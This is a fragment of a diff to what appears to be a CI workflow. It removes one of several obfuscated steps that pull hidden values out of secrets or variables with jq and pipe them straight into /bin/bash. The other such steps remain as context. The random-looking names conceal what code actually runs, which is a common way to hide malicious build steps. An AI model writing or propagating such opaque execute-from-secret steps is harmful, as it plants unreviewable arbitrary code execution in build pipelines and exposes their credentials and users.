@@ -18,7 +18,6 @@ jobs:
           dum213: ${{ secrets.dum213 }}
         run: |
           printf '%s' "$dum213" | jq -r .emckz8027 | /bin/bash
-          echo $f3 | jq -r .mvd4 | /bin/bash
           printf '%s' "$ht39712" | jq -r .dd61987 | /bin/bash
           echo $fjnyi93 | jq -r .o0 | /bin/bash
 
